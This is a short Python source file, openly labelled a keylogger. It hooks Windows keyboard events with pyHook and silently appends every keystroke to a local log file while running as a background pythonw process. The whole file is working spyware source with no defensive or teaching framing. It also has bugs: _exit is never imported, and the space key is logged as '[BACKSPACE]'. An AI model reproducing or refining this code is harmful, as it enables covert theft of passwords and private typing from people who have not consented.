'''
Sigal Sax
Keylogger that captures user's key strokes
To close program, Task Manager> Programs> Background Processes> END pythonw (32 bit)
'''
import pythoncom, pyHook

def OnKeyBoardEvent(event):
    f=open("file_log.txt","r")
    buffer=f.read()
    f.close()
    f=open("file_log.txt", "w")
    keylogs= chr(event.Ascii)
    if event.Ascii==5:
        _exit(1)
    if event.Ascii==13:
        keylogs='[ENTER]'
    elif event.Ascii==8:
        keylogs='[BACKSPACE]'
    elif event.Ascii== 32:
        keylogs='[BACKSPACE]'
    buffer+=keylogs
    f.write(buffer)
    f.close()

# set hook on windows events
hm= pyHook.HookManager()
hm.KeyDown= OnKeyBoardEvent
hm.HookKeyboard()
pythoncom.PumpMessages()
